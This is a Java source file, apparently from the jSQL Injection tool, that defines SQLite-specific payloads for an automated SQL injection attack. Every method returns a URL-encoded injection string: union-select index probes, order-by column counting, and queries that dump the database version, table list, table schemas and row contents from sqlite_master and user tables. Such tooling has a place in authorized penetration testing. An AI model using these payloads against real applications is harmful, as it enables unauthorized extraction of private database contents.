package com.jsql.model.injection.vendor;

import static com.jsql.model.accessible.DataAccess.SEPARATOR_SQL;
import static com.jsql.model.accessible.DataAccess.TD_SQL;
import static com.jsql.model.accessible.DataAccess.TRAIL_SQL;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.MediatorModel;
import com.jsql.model.bean.database.Database;
import com.jsql.model.bean.database.Table;
import com.jsql.util.StringUtil;

public class SQLiteVendor extends AbstractVendorDefault {
    @Override
    public String sqlInfos() {
        return
            "select+sqlite_version()||'"+ SEPARATOR_SQL +"'||'sqlite_master'||'"+ SEPARATOR_SQL +"'||'anonymous'||'"+ TRAIL_SQL +"'";
    }

    @Override
    public String sqlDatabases() {
        return
            "select'%04'||r||'%05'||q||'%04"+ TRAIL_SQL +"'from(select'sqlite_master'r,count(*)q+from+sqlite_master+WHERE+type='table'){limit}";
    }

    @Override
    public String sqlTables(Database database) {
        return
            "select+group_concat('%04'||name||'%050%04','"+ TD_SQL +"')||'"+ TRAIL_SQL +"'from(select+*+from+sqlite_master+WHERE+type='table'ORDER+BY+tbl_name{limit})";
    }

    @Override
    public String sqlColumns(Table table) {
        return
            "select+sql||'"+ TRAIL_SQL +"'from+sqlite_master+where+tbl_name='"+ table.toString() +"'and+type='table'{limit}";
    }

    @Override
    public String sqlRows(String[] columns, Database database, Table table) {
        // character 7f, last available hexa character (starting at character 80, it gives ?)
        String formatListColumn = StringUtil.join(columns, ",''))||'%7f'||trim(ifnull(");
        
        formatListColumn = "trim(ifnull(" + formatListColumn + ",''))";
 
        return
            "select+ifnull(group_concat('%04'||"+ formatListColumn +"||'%050%04','"+ TD_SQL +"'),'')||'"+ TRAIL_SQL +"'from(select+distinct+"+ StringUtil.join(columns,",") +"+from+"+ table +"{limit})";
        
    }    

    @Override
    public String sqlNormal(String sqlQuery, String startPosition) {
        return
            "(select'SQLi'||substr((" + sqlQuery + ")," + startPosition + ",65536))";
    }

    @Override
    public String sqlCapacity(String[] indexes) {
        return
            MediatorModel.model().getIndexesInUrl().replaceAll(
                "1337(" + StringUtil.join(indexes, "|") + ")7331",
                "(select'SQLi$1'||replace(substr(quote(zeroblob((65536%2B1)/2)),3,65536),'0','%23')||'iLQS')"
            );
    }

    @Override
    public String sqlIndices(Integer nbFields) {
        List<String> fields = new ArrayList<>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("1337"+ i +"7330%2b1");
        }
        return "+union+select+" + StringUtil.join(fields.toArray(new String[fields.size()]), ",") + "--+";
    }

    @Override
    public String sqlOrderBy() {
        return "+order+by+1337--+";
    }

    @Override
    public String sqlLimit(Integer limitSQLResult) {
        return "+limit+65536+offset+" + limitSQLResult;
    }
}